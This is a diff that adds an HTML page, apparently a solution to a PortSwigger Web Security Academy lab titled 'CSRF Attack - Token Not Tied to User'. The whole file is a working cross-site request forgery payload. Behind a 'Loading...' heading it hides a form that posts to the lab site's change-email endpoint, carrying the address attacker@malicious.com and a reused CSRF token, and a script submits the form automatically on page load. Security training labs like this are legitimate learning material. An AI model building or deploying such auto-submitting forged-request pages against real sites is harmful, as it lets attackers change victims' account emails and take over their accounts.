@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack - Token Not Tied to User</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+    
+    <form id="csrfForm" action="https://0a0000260418cb7580360d2700770021.web-security-academy.net/my-account/change-email" method="POST" style="display:none;">
+        <input type="hidden" name="email" value="attacker@malicious.com">
+        <input type="hidden" name="csrf" value="mFK3C7llSMkupHTx7hh3HOJLW2YnSB4r">
+    </form>
+
+    <script>
+        // Automatically submit the form when the page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('csrfForm').submit();
+        });
+    </script>
+</body>
+</html>
